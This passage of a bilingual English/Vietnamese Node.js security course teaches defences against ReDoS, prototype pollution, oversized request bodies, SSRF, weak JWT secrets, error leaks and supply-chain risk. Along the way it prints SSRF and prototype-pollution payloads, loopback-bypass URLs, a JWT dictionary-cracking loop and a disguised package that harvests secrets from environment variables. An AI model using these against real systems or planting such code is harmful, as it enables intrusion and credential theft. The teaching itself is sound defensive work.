  200 {"DATABASE_URL":"postgres://prod:sieu-mat@db:5432/app","R2_SECRET":"wJalr…"}</div>
<p><code>fetch</code> follows redirects by default, and your validation only ever saw the first URL. Checking the hostname is necessary and not sufficient.</p></div>
<div class="lz-flow">
  <div class="lz-step"><span class="lz-t">redirect: 'manual'</span><span class="lz-d">follow redirects yourself, re-validating every hop</span></div>
  <div class="lz-step"><span class="lz-t">Resolve then check the IP</span><span class="lz-d">a hostname you allow can still resolve to 127.0.0.1 or 10.0.0.0/8 — reject private ranges after DNS, and be aware of DNS rebinding between check and connect</span></div>
  <div class="lz-step"><span class="lz-t">Better: do not take URLs</span><span class="lz-d">take an identifier and build the URL yourself, or route outbound fetches through a proxy that can only reach the public internet</span></div>
</div>

<div class="note-ct">
<p><strong>How cuongthai.com handles these.</strong> Body limits: <code>express.json({ limit: '10mb' })</code> and the same for <code>urlencoded</code> in <code>src/index.ts</code> — chosen for rich-text payloads, and the reason media never travels as JSON. Outbound fetches follow the "do not take URLs" rule: the GIPHY proxy at <code>/api/v1/gifs</code> (<code>src/routes/gifs.routes.ts</code>) accepts a search term and a limit, and <em>constructs</em> the GIPHY URL server-side with a key from runtime env — the client can never influence which host is contacted. That route exists for a different reason (keeping the API key out of the browser bundle, chapter 4), and it happens to be SSRF-proof by construction. That is typical: the design that keeps secrets out of the client is usually also the design that keeps the fetch target under your control.</p>
</div>

<div class="pitfall">
<p><strong>Three things that look like defences and are not.</strong> (1) A regex on the URL — <code>http://127.1</code>, <code>http://[::1]</code>, <code>http://2130706433</code> and <code>http://localhost.evil.example</code> all resolve to loopback and defeat naive string checks; parse with <code>new URL()</code> instead. (2) A timeout on the regex — JavaScript is single-threaded, there is nothing to interrupt the running <code>RegExp</code>; the only real timeout is running it in a worker thread. (3) Trusting that <code>JSON.parse</code> "cleans" input — it happily produces an object with <code>__proto__</code> as an own key, as measured above.</p>
</div>

<a class="link-card codelab" href="/code-lab/typescript${REF}#module-570" target="_blank" rel="noopener">
  <span class="lc-ico">⌨️</span>
  <span class="lc-body"><span class="lc-title">Module 570 — Runtime Type Systems and Validation Libraries</span><span class="lc-sub">10 bài tập: zod, chặn khoá lạ, giới hạn độ dài trước khi xử lý.</span></span>
</a>
<a class="link-card exphub" href="/exp-hub${REF}" target="_blank" rel="noopener">
  <span class="lc-ico">🧰</span>
  <span class="lc-body"><span class="lc-title">Exp Hub — mẹo và đoạn code hay dùng</span><span class="lc-sub">Tra nhanh cú pháp zod, helmet, cors khi đang code.</span></span>
</a>
</div>

<div class="ml-vi">
<span class="eyebrow">Chương 9 · Bài 9.3</span>
<h2>Đầu vào là kẻ thù: ReDoS, ô nhiễm nguyên mẫu, giới hạn thân request, SSRF</h2>
<p class="lead">Bài 9.2 nói về dữ liệu ĐI RA khỏi hệ thống của bạn để vào một trang web. Bài này nói về dữ liệu ĐI VÀO. Bốn đòn tấn công, không đòn nào cần mật khẩu, token ăn cắp được hay một lỗ XSS. Mỗi đòn là một request trông rất bình thường mà lớp kiểm tra của bạn sẽ vui vẻ nhận, và mỗi đòn đều đi kèm một phép đo cho thấy chính xác nó khiến bạn trả giá bao nhiêu.</p>

<h3>1. ReDoS — 31 ký tự đóng băng cả máy chủ</h3>
<p>Một biểu thức chính quy có lượng từ lồng nhau. Nó không hề kỳ quái; các biến thể của nó nằm rải rác trong code kiểm tra dữ liệu ở khắp nơi:</p>
<pre><code><span class="tok-kw">const</span> RE = /^(a+)+$/;
RE.test(<span class="tok-str">'a'</span>.repeat(n) + <span class="tok-str">'!'</span>);   <span class="tok-cmt">// đầu vào KHÔNG khớp</span></code></pre>
<div class="out">20 ký tự →       8.0ms
22 ký tự →      32.4ms
24 ký tự →     135.7ms
26 ký tự →     537.5ms
28 ký tự →    1954.0ms
30 ký tự →    9478.8ms</div>
<p>Cứ thêm hai ký tự thì thời gian nhân lên khoảng bốn lần. Vì chuỗi kết thúc bằng <code>!</code> nên phép khớp buộc phải THẤT BẠI, và để chứng minh thất bại, bộ máy regex phải thử mọi cách chia <em>n</em> ký tự đó giữa dấu <code>+</code> trong và dấu <code>+</code> ngoài — một số lượng cách theo hàm mũ. Người ta gọi đây là "quay lui thảm hoạ", và hãy nhìn kỹ đầu vào: 31 ký tự. Không phải một gigabyte. Ba mươi mốt byte trong một ô nhập liệu.</p>
<p>Giờ đo xem nó làm gì với máy chủ, bằng đúng kỹ thuật nhịp tim của chương 2:</p>
<div class="out">=== Nhịp tim 100ms trong lúc RE.test(30 ký tự) chạy ===
  regex 7652ms → nhịp tim trễ tối đa 7552ms</div>
<p>Biểu thức chính quy là JavaScript đồng bộ. Nó chặn event loop y hệt vòng lặp <code>for</code> ở bài 2.4 — chặn mọi request khác, mọi timer, mọi socket, trong 7,5 giây. Một kẻ tấn công gửi mười cái như vậy mỗi giây là hạ được API của bạn, với lượng traffic không đủ để nhô lên trên bất kỳ biểu đồ nào.</p>
<div class="callout warn"><p>Bạn có thể phản đối rằng <code>/^(a+)+$/</code> là ví dụ đồ chơi. Vậy đây là một cái trông đúng như thứ bạn sẽ tự viết — "cắt khoảng trắng ở cuối chuỗi":</p>
<div class="out">/^([\\s\\S]*?)(\\s+)+$/
  10 dấu cách →      0.2ms
  18 dấu cách →      4.2ms
  22 dấu cách →     64.1ms
  26 dấu cách →   1115.5ms
  28 dấu cách →   4355.7ms</div>
<p>Hai mươi tám dấu cách. Cái khiến nó bùng nổ là <code>(\\s+)+</code> — một lượng từ đặt lên một nhóm mà bản thân nhóm đó đã kết thúc bằng một lượng từ trên cùng lớp ký tự.</p></div>
<div class="kv-grid">
  <div class="kv"><span class="k">Nhận diện thế nào</span><span class="v">Tìm một lượng từ bọc quanh một nhóm vốn đã có lượng từ: <code>(a+)+</code>, <code>(a*)*</code>, <code>(\\s+)+</code>, <code>(.*,)*</code>. Cả các phép hoặc mà các nhánh khớp được cùng một đoạn văn bản: <code>(a|aa)+</code>.</span></div>
  <div class="kv"><span class="k">Chặn độ dài TRƯỚC</span><span class="v">Kiểm <code>max(200)</code> bằng zod (bài 6.3) <em>trước khi</em> bất kỳ regex nào chạm vào giá trị. Hàm mũ trên đầu vào bị chặn trên là một chi phí bị chặn trên.</span></div>
  <div class="kv"><span class="k">Ưu tiên không dùng regex</span><span class="v"><code>String.prototype.trimEnd()</code>, <code>includes</code>, <code>split</code>, <code>URL</code>, <code>Number.isInteger</code> — đều tuyến tính. Phần lớn regex "thông minh" trong một dự án chỉ thay thế ba dòng code nhàm chán và nhanh.</span></div>
  <div class="kv"><span class="k">Đừng tự viết regex email</span><span class="v">Mấy bản "đúng chuẩn RFC" nổi tiếng chính là nguyên liệu ReDoS. Dùng <code>z.string().email()</code> hoặc đơn giản là gửi thư xác nhận — cách kiểm tra thật sự duy nhất của một địa chỉ email.</span></div>
</div>

<h3>2. Ô nhiễm nguyên mẫu — một khoá JSON biến mọi người thành admin</h3>
<p>Dự án nào cũng có một hàm trộn sâu. Đây là chuyện xảy ra khi object đem trộn đến từ <code>req.body</code>:</p>
<pre><code><span class="tok-kw">function</span> <span class="tok-fn">merge</span>(target, src) {
  <span class="tok-kw">for</span> (<span class="tok-kw">const</span> k <span class="tok-kw">of</span> Object.keys(src)) {
    <span class="tok-kw">if</span> (<span class="tok-kw">typeof</span> src[k] === <span class="tok-str">'object'</span> &amp;&amp; src[k] !== <span class="tok-kw">null</span>) { target[k] ??= {}; merge(target[k], src[k]); }
    <span class="tok-kw">else</span> target[k] = src[k];
  }
  <span class="tok-kw">return</span> target;
}
merge({ name: <span class="tok-str">'An'</span> }, JSON.parse(<span class="tok-str">'{"__proto__":{"isAdmin":true}}'</span>));</code></pre>
<div class="out">Object.keys(req.body) = ["__proto__"] ← "__proto__" là khoá THẬT sau JSON.parse
trước khi trộn: ({}).isAdmin = undefined
sau khi trộn  : ({}).isAdmin = true
kiểm tra quyền: user.isAdmin → CHO QUA (!!)   — user chưa từng được gán isAdmin
Object.create(null).isAdmin = undefined ← object không nguyên mẫu thì miễn nhiễm
new Map().get("isAdmin")    = undefined</div>
<p>Đọc kỹ dòng thứ tư. <code>user</code> là một object hoàn toàn không liên quan, chẳng ai gán <code>isAdmin</code> cho nó cả. Nó THỪA KẾ thuộc tính đó từ <code>Object.prototype</code>, cái vừa bị hàm merge sửa. Từ giây phút đó, <strong>mọi object thường trong tiến trình</strong>, với mọi người dùng, cho tới khi khởi động lại, đều trả lời <code>true</code> cho phép kiểm tra kia. Đó là điểm khiến ô nhiễm nguyên mẫu khác một cái bug thông thường: nó không bị giới hạn trong request đã gây ra nó.</p>
<p>Ba lớp phòng thủ, xếp theo mức độ hữu ích:</p>
<div class="lz-stack">
  <div class="lz-layer"><span class="lz-lname">Kiểm bằng schema</span><span class="lz-lnote">zod <code>.object()</code> vứt các khoá lạ (bài 6.3) — <code>__proto__</code> không có trong schema nên không bao giờ tới được hàm merge</span></div>
  <div class="lz-layer"><span class="lz-lname">Chặn tường minh các khoá nguy hiểm</span><span class="lz-lnote">bỏ qua <code>__proto__</code>, <code>constructor</code>, <code>prototype</code> trong mọi phép sao chép đệ quy — đo bên dưới, nó có tác dụng</span></div>
  <div class="lz-layer"><span class="lz-lname">Dùng cấu trúc không có nguyên mẫu</span><span class="lz-lnote"><code>Object.create(null)</code> và <code>Map</code> miễn nhiễm; dùng <code>Map</code> cho dữ liệu khoá/giá trị do người dùng kiểm soát vốn dĩ cũng là lựa chọn đúng về mặt cấu trúc</span></div>
</div>
<div class="out">Bản vá 1 — bỏ qua khoá nguy hiểm:
  sau safeMerge : ({}).isAdmin = undefined</div>
<p>Và một tin tốt mà bạn nên tự kiểm chứng thay vì tin sẵn — cách Express phân tích query string:</p>
<div class="out">=== req.query: "simple" (mặc định Express 5) vs "extended" (qs) ===
  simple    → {"tags":["a","b"],"user[__proto__][isAdmin]":"true","user[name]":"An"}   poisoned=null
  extended  → {"tags":["a","b"],"user":{"name":"An"}}                                  poisoned=null</div>
<p>Cả hai bộ phân tích đều không gây ô nhiễm. <code>simple</code> giữ nguyên cú pháp ngoặc vuông làm tên khoá; còn <code>qs</code> (bộ <code>extended</code>) dựng object lồng nhau nhưng lặng lẽ vứt nhánh <code>__proto__</code>. Lỗ hổng không nằm ở Express — nó nằm ở hàm tiện ích bạn viết sau đó, cái đem <code>req.query</code> hay <code>req.body</code> trộn vào chỗ khác.</p>

<h3>3. Giới hạn thân request — một request, +139MB RSS</h3>
<p><code>express.json()</code> mặc định <strong>100kb</strong>, và từ chối một cách lịch sự khi vượt:</p>
<div class="out">90KB  → 200 {"len":92168}
200KB → 413 {"type":"entity.too.large","message":"request entity too large","limit":102400}</div>
<p>Ai cũng nâng giới hạn đó lên ngay lần đầu bị từ chối một payload thật. Đây là cái giá của việc nâng lên 20mb, đo trên chính tiến trình máy chủ:</p>
<div class="out">thân request: 11.3MB
RSS máy chủ lúc rảnh : 61 MB
RSS ngay sau 1 request: 200 MB (parse 82ms, 200000 phần tử)
RSS sau 1.5 giây      : 213 MB</div>
<p>Một request, 11,3MB trên đường truyền, <strong>+139MB bộ nhớ thường trú</strong> — khoảng 12 lần kích thước thân request, vì buffer thô, chuỗi đã giải mã và cây object đã phân tích cùng tồn tại một lúc, mà object JavaScript thì không hề gọn. Mười request như thế đến cùng lúc là 1,4GB. Trên con VPS 6GB mà dự án này từng chạy, đó là lúc OOM killer đem container của bạn đi, và cái request kích hoạt nó trông hoàn toàn hợp lệ.</p>
<div class="kv-grid">
  <div class="kv"><span class="k">Đặt giới hạn theo từng route</span><span class="v">Đặt 10mb toàn cục chỉ vì MỘT endpoint upload cần thế là trao cho mọi endpoint khác cùng thứ vũ khí đó. Hãy gắn <code>express.json({ limit: '100kb' })</code> toàn cục và một parser lớn hơn chỉ ở nơi thật sự cần.</span></div>
  <div class="kv"><span class="k">File không đi qua JSON</span><span class="v">Upload thuộc về <code>multipart/form-data</code>, truyền dòng thẳng ra kho lưu trữ (chương 10), không bao giờ nhét base64 vào thân JSON — base64 còn làm phình thêm 33% trước cả khi phân tích.</span></div>
  <div class="kv"><span class="k">Chặn cả độ dài mảng</span><span class="v">Một thân request 90KB nằm dưới giới hạn vẫn có thể chứa 5.000 phần tử mà việc xử lý là <code>O(n²)</code>. Hãy kiểm <code>.max()</code> trên độ dài mảng, không chỉ trên số byte.</span></div>
</div>

<h3>4. SSRF — bắt máy chủ tự đi đọc bí mật của chính nó</h3>
<p>Tính năng thì hết sức bình thường: xem trước một link, nhập ảnh đại diện từ URL, nút thử webhook. Người dùng đưa một URL và máy chủ đi lấy nó.</p>
<pre><code>app.get(<span class="tok-str">'/preview'</span>, <span class="tok-kw">async</span> (req, res) =&gt; {
  <span class="tok-kw">const</span> r = <span class="tok-kw">await</span> fetch(req.query.url);      <span class="tok-cmt">// ← toàn bộ lỗ hổng nằm ở đây</span>
  res.type(<span class="tok-str">'text'</span>).send(<span class="tok-kw">await</span> r.text());
});</code></pre>
<p>Một dịch vụ nội bộ hoàn toàn không mở ra Internet đang lắng nghe ở cổng 4404. Kẻ tấn công không cần với tới nó — máy chủ của bạn với tới được, và máy chủ của bạn mới là bên gửi request:</p>
<div class="out">/preview?url=http://127.0.0.1:4404/admin/config →
  200 {"DATABASE_URL":"postgres://prod:sieu-mat@db:5432/app","R2_SECRET":"wJalr…"}</div>
<p>Toàn bộ đòn tấn công chỉ có thế. Trong một mạng container, cùng chiêu đó với tới <code>http://postgres:5432</code>, <code>http://redis:6379</code>, socket của Docker, hoặc — trên máy ảo đám mây — endpoint metadata ở <code>169.254.169.254</code> nơi phát ra thông tin đăng nhập IAM tạm thời. Tường lửa không làm gì sai cả: request đến từ bên trong.</p>
<p>Giờ tới bản đã sửa, và cái bẫy nằm trong đó:</p>
<pre><code><span class="tok-kw">const</span> ALLOW = <span class="tok-kw">new</span> Set([<span class="tok-str">'media.cuongthai.com'</span>, <span class="tok-str">'i.giphy.com'</span>]);
<span class="tok-kw">const</span> u = <span class="tok-kw">new</span> URL(req.query.url);
<span class="tok-kw">if</span> (u.protocol !== <span class="tok-str">'https:'</span>) <span class="tok-kw">return</span> res.status(<span class="tok-num">400</span>).json({ error: <span class="tok-str">'chỉ chấp nhận https'</span> });
<span class="tok-kw">if</span> (!ALLOW.has(u.hostname)) <span class="tok-kw">return</span> res.status(<span class="tok-num">400</span>).json({ error: <span class="tok-str">'tên miền không nằm trong danh sách trắng'</span> });</code></pre>
<div class="out">/preview-safe (cùng URL nội bộ) → 400 {"error":"chỉ chấp nhận https"}
/preview-safe (ảnh hợp lệ)      → 200 {"ok":"sẽ đi lấy","host":"media.cuongthai.com"}
/preview?url=file:///etc/hostname → fetch failed (undici không hỗ trợ file:)</div>
<div class="callout danger"><p>Và đây là cái bẫy. Kẻ tấn công đưa cho bạn một URL vượt qua MỌI phép kiểm tra — một host https thật mà họ sở hữu — rồi host đó trả về <code>302</code>:</p>
<div class="out">/preview?url=http://127.0.0.1:4406/anh.png (URL "vô hại" rồi 302 về nội bộ) →
  200 {"DATABASE_URL":"postgres://prod:sieu-mat@db:5432/app","R2_SECRET":"wJalr…"}</div>
<p><code>fetch</code> mặc định đi theo chuyển hướng, còn lớp kiểm tra của bạn chỉ nhìn thấy URL đầu tiên. Kiểm tên miền là cần thiết nhưng chưa đủ.</p></div>
<div class="lz-flow">
  <div class="lz-step"><span class="lz-t">redirect: 'manual'</span><span class="lz-d">tự đi theo chuyển hướng, kiểm tra lại ở TỪNG chặng</span></div>
  <div class="lz-step"><span class="lz-t">Phân giải rồi kiểm IP</span><span class="lz-d">một tên miền bạn cho phép vẫn có thể phân giải ra 127.0.0.1 hay 10.0.0.0/8 — hãy chặn các dải IP nội bộ SAU khi phân giải DNS, và biết rằng có đòn đổi DNS giữa lúc kiểm và lúc kết nối</span></div>
  <div class="lz-step"><span class="lz-t">Tốt hơn: đừng nhận URL</span><span class="lz-d">nhận một mã định danh rồi tự dựng URL, hoặc cho mọi lượt fetch ra ngoài đi qua một proxy chỉ với tới được Internet công cộng</span></div>
</div>

<div class="note-ct">
<p><strong>cuongthai.com xử lý mấy chuyện này thế nào.</strong> Giới hạn thân request: <code>express.json({ limit: '10mb' })</code> và tương tự cho <code>urlencoded</code> trong <code>src/index.ts</code> — chọn vì payload rich-text, và cũng là lý do media không bao giờ đi dưới dạng JSON. Các lượt fetch ra ngoài theo đúng luật "đừng nhận URL": proxy GIPHY ở <code>/api/v1/gifs</code> (<code>src/routes/gifs.routes.ts</code>) nhận một từ khoá tìm kiếm và một số lượng, rồi <em>tự dựng</em> URL GIPHY ở phía máy chủ với khoá lấy từ biến môi trường lúc chạy — client không bao giờ tác động được vào việc liên hệ với host nào. Route đó ra đời vì một lý do khác (giữ khoá API khỏi bundle của trình duyệt, chương 4), và tình cờ nó chống SSRF ngay từ thiết kế. Điều này rất điển hình: cái thiết kế giữ bí mật khỏi client thường cũng là cái thiết kế giữ đích đến của lượt fetch nằm trong tay bạn.</p>
</div>

<div class="pitfall">
<p><strong>Ba thứ trông như lớp phòng thủ mà không phải.</strong> (1) Một regex trên URL — <code>http://127.1</code>, <code>http://[::1]</code>, <code>http://2130706433</code> và <code>http://localhost.evil.example</code> đều trỏ về loopback và qua mặt kiểu kiểm chuỗi ngây thơ; hãy phân tích bằng <code>new URL()</code>. (2) Đặt timeout cho regex — JavaScript đơn luồng, không có gì để ngắt một <code>RegExp</code> đang chạy; timeout thật sự duy nhất là chạy nó trong worker thread. (3) Tin rằng <code>JSON.parse</code> "làm sạch" đầu vào — nó vui vẻ tạo ra object có <code>__proto__</code> làm khoá của chính nó, như đã đo ở trên.</p>
</div>

<a class="link-card codelab" href="/code-lab/typescript${REF}#module-570" target="_blank" rel="noopener">
  <span class="lc-ico">⌨️</span>
  <span class="lc-body"><span class="lc-title">Module 570 — Runtime Type Systems and Validation Libraries</span><span class="lc-sub">10 bài tập: zod, chặn khoá lạ, giới hạn độ dài trước khi xử lý.</span></span>
</a>
<a class="link-card exphub" href="/exp-hub${REF}" target="_blank" rel="noopener">
  <span class="lc-ico">🧰</span>
  <span class="lc-body"><span class="lc-title">Exp Hub — mẹo và đoạn code hay dùng</span><span class="lc-sub">Tra nhanh cú pháp zod, helmet, cors khi đang code.</span></span>
</a>
</div>
`,
    },
    /* ─────────────────────────── 9.4 ─────────────────────────── */
    {
      title: '9.4 — Secrets, dependencies and what your errors give away|||9.4 — Bí mật, phụ thuộc, và những gì lỗi của bạn khai ra',
      slug: 'nodejs-9-4-bi-mat-va-phu-thuoc',
      type: 'VIDEO',
      description: 'Bẻ khoá JWT yếu bằng từ điển trong 1ms, so sánh chuỗi bí mật cho đúng, đo xem một dự án Node điển hình cho bao nhiêu gói quyền đọc biến môi trường, và viết thông báo lỗi không khai báo gì.',
      content: `
<div class="ml-en">
<span class="eyebrow">Chapter 9 · Lesson 9.4</span>
<h2>Secrets, dependencies and what your errors give away</h2>
<p class="lead">The first three lessons were about requests. This one is about your own process: the values it holds, the code it runs that you did not write, and what it says when something goes wrong. None of these is exciting to work on, and all three are how real systems actually get breached — far more often than by a clever payload.</p>

<h3>Measurement 1 — a weak JWT secret is not "a bit weaker"</h3>
<p>Chapter 8 built the whole auth system on <code>JWT_SECRET</code>. Here is what happens if that value is a word. The attacker has one thing: a token, which any logged-in user can read out of their own browser.</p>
<pre><code><span class="tok-kw">const</span> WEAK = [<span class="tok-str">'secret'</span>, <span class="tok-str">'password'</span>, <span class="tok-str">'123456'</span>, <span class="tok-str">'changeme'</span>, <span class="tok-str">'jwt_secret'</span>,
             <span class="tok-str">'supersecret'</span>, <span class="tok-str">'mysecretkey'</span>, <span class="tok-str">'secretkey'</span>, <span class="tok-str">'nodejs'</span>, <span class="tok-str">'admin123'</span>];
<span class="tok-kw">for</span> (<span class="tok-kw">const</span> w <span class="tok-kw">of</span> WEAK) { <span class="tok-kw">try</span> { jwt.verify(token, w); found = w; <span class="tok-kw">break</span> } <span class="tok-kw">catch</span> {} }</code></pre>
<div class="out">từ điển 10 từ → tìm thấy "supersecret" trong 1.04ms
tốc độ thử: 35.465 bí mật/giây trên MỘT nhân
vét cạn 8 ký tự thường (26^8)        = 68,2 ngày
vét cạn 8 ký tự chữ+số (36^8)        = 2,5 năm
vét cạn 32 byte ngẫu nhiên (2^256)   = 1,0e+65 năm
crypto.randomBytes(32).toString('base64url') = xUMtHMbnIi6NDoiYUqHLnNsgPLpRnGpdcZp0KD1qk6g</div>
<p>One millisecond. And once the secret is known the attacker does not steal a session — they <em>mint</em> tokens: any user id, any role, any expiry, signed correctly. Every defence from chapter 8 (rotation, revocation, rate limiting) is bypassed, because from the server's point of view these tokens are genuine.</p>
<p>Notice the third line too: an eight-character alphanumeric password, the kind a human invents, falls in 2.5 years on one core — which means days on rented GPUs. The bottom line is the only acceptable one: <strong>32 bytes from a CSPRNG, generated by a machine, never typed by a person.</strong></p>
<div class="callout"><p>The same rule applies to every secret with the same shape: session keys, webhook signing secrets, internal service tokens, cron trigger keys. If a human could remember it, it is too short.</p></div>

<h3>Measurement 2 — comparing secrets</h3>
<p>When you check an API key, <code>a === b</code> returns as soon as it finds a differing byte. The time it takes therefore depends on how many leading bytes are correct, which is information an attacker can measure and use to build the key one byte at a time. Node ships the fix:</p>
<pre><code><span class="tok-kw">const</span> cmpSafe = (a, b) =&gt; {
  <span class="tok-kw">const</span> x = Buffer.from(a), y = Buffer.from(b);
  <span class="tok-kw">return</span> x.length === y.length &amp;&amp; crypto.timingSafeEqual(x, y);
};</code></pre>
<div class="out">timingSafeEqual độ dài khác nhau → ném ERR_CRYPTO_TIMING_SAFE_EQUAL_LENGTH
cmpSafe("abc","abcd") = false | cmpSafe đúng key = true | cmpNaive = true</div>
<p>Two practical notes. <code>timingSafeEqual</code> <strong>throws</strong> on different lengths rather than returning false, so always guard the length yourself — as the wrapper above does. And in practice you rarely need this: comparing a <em>hash</em> of the key (chapter 8's pattern for refresh tokens) is both timing-safe by construction and safer if the database leaks.</p>

<h3>Measurement 3 — what your error messages tell an attacker</h3>
<p>The most common information leak in a Node backend is one line of well-intentioned code: <code>res.status(500).json({ error: err.message })</code>.</p>
<div class="out">trả nguyên err: {"error":"ENOENT: no such file or directory,
                          open '/opt/cuongthai/.env.production'",
                 "stack":["Error: ENOENT: …","    at Object.openSync (node:fs:561:18)"]}
nên trả     : {"error":"INTERNAL","requestId":"90779998-0e6f-4c9d-9538-bd4b59980836"}</div>
<p>The first response gives away the deployment path, the fact that there is a <code>.env.production</code>, and the Node version through stack frame details. Database errors are worse: a connection failure prints the host, port and username; a Prisma <code>P2002</code> prints the constraint and column names, i.e. your schema.</p>
<div class="lz-flow">
  <div class="lz-step"><span class="lz-t">Log everything, in full</span><span class="lz-d">message, stack, request id, user id — to your log, where only you read it</span></div>
  <div class="lz-step"><span class="lz-t">Return almost nothing</span><span class="lz-d">a stable error code and the same request id — enough for a user to quote in a support ticket</span></div>
  <div class="lz-step"><span class="lz-t">Distinguish 4xx from 5xx</span><span class="lz-d">a validation error <em>should</em> be specific (lesson 6.3); an internal error should not be</span></div>
</div>
<p>The request id is what makes this workable: the user sends you eight characters, you find the full stack in the log. Production on this project sets it as <code>X-Request-ID</code> on every response — you can see it with <code>curl -sI https://cuongthai.com/api/v1/courses</code>.</p>

<h3>Measurement 4 — how much code you did not write</h3>
<p>The chapter 8 sandbox — a small Express + Prisma + auth app with <strong>nine</strong> direct dependencies:</p>
<div class="out">$ node -e "console.log(Object.keys(require('./package.json').dependencies).length)"
9
$ find node_modules -maxdepth 2 -name package.json | wc -l
183</div>
<p>Nine packages you chose, 183 packages you run. Every one of them executes with the full privileges of your process: <code>process.env</code>, the filesystem, the network. Here is a "utility" package doing exactly that — the top line is the real function, the rest is the payload:</p>
<pre><code>module.exports = (s, n) =&gt; String(s).padStart(n, <span class="tok-str">' '</span>);

<span class="tok-kw">const</span> loot = Object.entries(process.env)
  .filter(([k]) =&gt; /SECRET|KEY|TOKEN|PASSWORD|DATABASE/i.test(k));
require(<span class="tok-str">'fs'</span>).writeFileSync(<span class="tok-str">'/tmp/ch9-loot.json'</span>, JSON.stringify(loot));</code></pre>
<div class="out">$ DATABASE_URL=… JWT_SECRET=… R2_SECRET_ACCESS_KEY=… node app.js
[left-pad-vn] đã gửi 3 biến môi trường đi nơi khác
kết quả bình thường: "   7"
file kẻ tấn công ghi ra: [["DATABASE_URL","postgres://prod:sieu-mat@db:5432/app"],
                          ["JWT_SECRET","kh0ng-ai-doan-duoc"],
                          ["R2_SECRET_ACCESS_KEY","wJalrXUtnFEMI"]]</div>
<p>The function still returns the right answer. Tests pass. In a real incident the write goes to a network request instead of a file, and the only trace is an outbound connection nobody is watching. Chapter 4 measured the install-time version of this (<code>postinstall</code> writing to your home directory before you import anything); this is the runtime version, and <code>--ignore-scripts</code> does nothing about it.</p>
<div class="kv-grid">
  <div class="kv"><span class="k">Fewer dependencies</span><span class="v">The strongest control by a distance. "Is this worth 40 more packages?" is a security question, not a taste question.</span></div>
  <div class="kv"><span class="k">Lockfile + <code>npm ci</code></span><span class="v">You audited a specific tree; install <em>that</em> tree (lesson 4.2). A caret range means tomorrow's build runs code nobody reviewed.</span></div>
  <div class="kv"><span class="k">Read the diff on updates</span><span class="v">Not every line — but a package that suddenly gains network code or a new transitive dependency is worth thirty seconds of attention.</span></div>
  <div class="kv"><span class="k">Least privilege at runtime</span><span class="v">The container should hold only the env vars that process needs. A backend that never touches R2 should not have <code>R2_SECRET_ACCESS_KEY</code> in its environment at all.</span></div>
</div>

<h3>Where secrets actually live</h3>
<div class="lz-stack">
  <div class="lz-layer"><span class="lz-lname">Code / git</span><span class="lz-lnote">NEVER. And when it happens: rotate the secret. Deleting the line does not help — git history and every clone still have it</span></div>
  <div class="lz-layer"><span class="lz-lname">Docker image</span><span class="lz-lnote">No. A layer is readable by anyone who can pull the image; <code>ARG</code> values are visible in the build history</span></div>
  <div class="lz-layer"><span class="lz-lname">Runtime environment</span><span class="lz-lnote">Yes — injected when the container starts, from a file the deploy never overwrites</span></div>
  <div class="lz-layer"><span class="lz-lname">A secret manager</span><span class="lz-lnote">Better again: rotation, audit trail, per-service access. The step after a single VPS</span></div>
</div>
<div class="pitfall">
<p><strong>The frontend variable that is not a secret.</strong> In Next.js, anything named <code>NEXT_PUBLIC_*</code> is inlined into the JavaScript bundle at <em>build</em> time — it ships to every visitor and no amount of restarting changes it. A third-party API key put there is public the moment you deploy. That is not theory on this project: the GIF picker once called GIPHY directly from the browser with <code>NEXT_PUBLIC_GIPHY_API_KEY</code>, which is exactly why <code>/api/v1/gifs</code> exists today as a server-side proxy. The rule: browser-facing third-party APIs go through a backend route, key read from runtime env.</p>
</div>

<div class="note-ct">
<p><strong>How cuongthai.com handles secrets.</strong> Production runtime env lives in <code>/opt/cuongthai/.env</code> on the VPS; <code>deploy.sh</code> loads it on every deploy and the rsync step <strong>excludes</strong> <code>.env*</code>, so values put there survive deploys permanently and never travel from a laptop. Nothing secret is baked into an image. The repository has a <code>gitleaks</code> pre-commit hook that refuses a commit containing anything shaped like a key — including, at one point, a randomly generated refresh token printed as an example in <em>this very course</em>; the fix was an explicit allow-list in <code>.gitleaks.toml</code> for <code>content/courses/</code> and <code>content/exphub/</code>, scoped to the <code>generic-api-key</code> rule only, verified by checking that a real RSA key in the same directory is still caught. That is the right shape for a security exception: as narrow as possible, and tested in both directions.</p>
</div>

<h3>A short pre-production checklist</h3>
<div class="lz-map">
  <div class="lz-node"><span class="lz-t">helmet + CSP</span><span class="lz-d">headers on, one owner per header (9.1)</span></div>
  <div class="lz-node"><span class="lz-t">CORS allow-list</span><span class="lz-d">explicit origins, never <code>origin: true</code> with credentials (9.1)</span></div>
  <div class="lz-node"><span class="lz-t">Sanitize on render</span><span class="lz-d">every <code>dangerouslySetInnerHTML</code> goes through one function (9.2)</span></div>
  <div class="lz-node"><span class="lz-t">Validate before use</span><span class="lz-d">zod schema, length caps, array caps, body limit (9.3)</span></div>
  <div class="lz-node"><span class="lz-t">No user-supplied URLs</span><span class="lz-d">or allow-list + manual redirects (9.3)</span></div>
  <div class="lz-node"><span class="lz-t">32-byte secrets</span><span class="lz-d">from a CSPRNG, in runtime env, rotatable (9.4)</span></div>
  <div class="lz-node"><span class="lz-t">Opaque 5xx</span><span class="lz-d">code + request id out, full stack to the log (9.4)</span></div>
  <div class="lz-node"><span class="lz-t">npm ci in CI</span><span class="lz-d">the tree you audited is the tree you ship (4.2)</span></div>
</div>
<p>Nothing on that list is difficult. All of it is the sort of work that only happens if someone writes it down — which is the actual point of this chapter.</p>

<a class="link-card codelab" href="/code-lab/nodejs-express${REF}#module-323" target="_blank" rel="noopener">
  <span class="lc-ico">⌨️</span>
  <span class="lc-body"><span class="lc-title">Module 323 — Authentication, Authorization, and Security</span><span class="lc-sub">10 bài tập: quản lý bí mật, so sánh an toàn, và xử lý lỗi không rò rỉ.</span></span>
</a>
<a class="link-card codelab" href="/code-lab/deploy-vps${REF}#module-1005" target="_blank" rel="noopener">
  <span class="lc-ico">⌨️</span>
  <span class="lc-body"><span class="lc-title">Module 1005 — Securing the Server (users, firewall, keys)</span><span class="lc-sub">10 bài tập: khoá SSH, tường lửa, và quyền tối thiểu trên VPS.</span></span>
</a>
</div>

<div class="ml-vi">
<span class="eyebrow">Chương 9 · Bài 9.4</span>
<h2>Bí mật, phụ thuộc, và những gì lỗi của bạn khai ra</h2>
<p class="lead">Ba bài đầu nói về các request. Bài này nói về chính tiến trình của bạn: những giá trị nó đang giữ, đoạn code nó đang chạy mà bạn không viết, và những gì nó nói ra khi có chuyện. Không phần nào trong đây thú vị để làm, và cả ba đều là cách các hệ thống thật bị xâm nhập — thường xuyên hơn nhiều so với một payload thông minh.</p>

